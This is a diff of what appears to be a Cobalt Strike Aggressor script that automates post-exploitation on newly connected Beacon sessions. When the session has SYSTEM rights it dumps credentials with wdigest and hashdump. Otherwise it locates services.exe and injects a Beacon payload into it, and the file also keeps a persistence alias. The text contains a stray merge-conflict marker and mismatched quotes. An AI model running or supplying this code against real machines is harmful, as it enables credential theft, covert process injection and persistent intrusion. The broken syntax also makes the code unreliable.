@@ -4,29 +4,40 @@
 # Created: 29 Sept 2016 Modified: 11 Jan 2017
 # Version 1.0
 #################################################
+
+sub getanypid {
+  bps($1, lambda({
+    local('$pid $name $entry');
+    foreach $entry (split("\n", $2)) {
+      ($name, $ppid, $pid) = split("\\s+", $entry);
+      if ($name eq $proc) {
+        # $1 is our Beacon ID, $pid is the PID of $proc
+        [$callback: $1, $proc, $pid];
+      }
+    }
+  }, $proc => $2, $callback => $3));
+}
+
+
 on beacon_initial {
     $listener = "local - 443"'
     if("SYSTEM" isin beacon_info($1, "user")) {
       bwdigest($1);
       bhashdump($1);
       blog2($1, "I should setup some persistence...");
-      bpowershell_import($1, script_resource("killparents.ps1"));
-      bpowershell($1, "Invoke-ParentalKilling");
-    }
-    else if(" *" isin beacon_info($1, "user")) {
-      belevate($1, $listener);
-      bsleep($1, 300, 30);
-      bnote($1, "Sleeping - 300 30%");
-      bpowershell_import($1, script_resource("killparents.ps1"));
-      bpowershell($1, "Invoke-ParentalKilling");
     }
     else {
       say("just a regular user, hopefully elevation works");
-      bbypassuac($1, $listener");
+
+### assuming it is x64 for now
+      getanypid($1, "services.exe", {
+        binject($1, $3, $listener, "x64");
+      });
+    }
+
+
       bsleep($1, 300, 30);
       bnote($1, "Sleeping - 300 30%");
-      bpowershell_import($1, script_resource("killparents.ps1"));
-      bpowershell($1, "Invoke-ParentalKilling");
     }
 =======
 sub persist {
@@ -46,23 +57,6 @@ sub persist {
     }
 };
 
-#### Testing ###
-### Using: https://github.com/Und3rf10w/Aggressor-scripts/blob/master/auto-keylogger.cna
-### Repurpose this to get pid.
-alias getexplorerpid {
-    bps($1, lambda({
-        local('$pid $name $entry');
-        foreach $entry (split("\n", $2)) {
-            ($name, $ppid, $pid, $arch) = split("\\s+", $entry);
-            println($entry);
-            println("Name: $name PID: $pid ");
-            if ($name eq "explorer.exe") {
-                #$1 is our Beacon ID, $pid is the PID of explorer.exe
-            blog("found it! $name")
-            }
-        }
-}, $callback => $2));
-}
 
 alias persist {
     if (-exists script_resource("adsvc.exe")) {
